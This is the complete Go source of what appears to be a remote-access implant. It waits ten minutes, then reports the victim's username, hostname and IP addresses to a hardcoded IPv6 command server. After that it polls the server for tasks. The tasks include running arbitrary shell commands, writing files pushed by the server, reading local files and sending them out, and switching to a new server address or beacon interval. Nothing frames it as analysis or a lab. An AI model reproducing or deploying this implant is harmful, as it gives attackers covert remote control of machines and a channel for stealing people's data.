package main

import (
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "time"
)

var endpoint = "https://[201:b479:2771:8df4:b5eb:d007:63b0:2838]"
var uuid = "d71f1722-cf0b-4e27-9f8e-c95ec9b24a23"
var interval = 5 * time.Minute

type Task struct {
    Command string `json:"command"`
    Data string `json:"data"`
    Path string `json:"path"`
}

func exchange(kind string, data interface{}) ([]byte, error) {
    payload, err := json.Marshal(map[string]interface{}{"uuid": uuid, "type": kind, "data": data})
    if err != nil { return nil, err }
    response, err := http.Post(endpoint, "application/json", bytes.NewReader(payload))
    if err != nil { return nil, err }
    defer response.Body.Close()
    return io.ReadAll(response.Body)
}

func main() {
    time.Sleep(10 * time.Minute)
    hostname, _ := os.Hostname()
    account, _ := user.Current()
    ips, _ := net.InterfaceAddrs()
    registration, err := exchange("checkin", map[string]interface{}{
        "username": account.Username, "hostname": hostname, "ips": ips,
    })
    if err != nil { return }
    var identity struct { UUID string `json:"uuid"` }
    if json.Unmarshal(registration, &identity) != nil { return }
    uuid = identity.UUID
    for {
        reply, err := exchange("tasking", nil)
        if err != nil { time.Sleep(interval); continue }
        var tasks []Task
        if json.Unmarshal(reply, &tasks) != nil { time.Sleep(interval); continue }
        for _, task := range tasks {
            var output []byte
            switch task.Command {
            case "shell":
                if runtime.GOOS == "windows" {
                    output, err = exec.Command("cmd.exe", "/c", task.Data).CombinedOutput()
                } else {
                    output, err = exec.Command("/bin/sh", "-c", task.Data).CombinedOutput()
                }
            case "upload":
                var body []byte
                body, err = exchange("getfile", task.Data)
                if err == nil {
                    var content struct { Data string `json:"data"` }
                    err = json.Unmarshal(body, &content)
                    if err == nil { output, err = base64.StdEncoding.DecodeString(content.Data) }
                    if err == nil { err = os.WriteFile(task.Path, output, 0600) }
                }
                output = []byte("OK")
            case "download":
                output, err = os.ReadFile(task.Data)
            case "cd":
                err = os.Chdir(task.Data)
            case "ls":
                entries, listErr := os.ReadDir(".")
                err = listErr
                for _, entry := range entries { output = append(output, []byte(entry.Name()+"\n")...) }
            case "pwd":
                var cwd string
                cwd, err = os.Getwd()
                output = []byte(cwd)
            case "churl":
                endpoint = task.Data
            case "chtime":
                interval, err = time.ParseDuration(task.Data)
            default:
                continue
            }
            if err != nil { output = []byte(fmt.Sprint(err)) }
            exchange("result", base64.StdEncoding.EncodeToString(output))
        }
        time.Sleep(interval)
    }
}
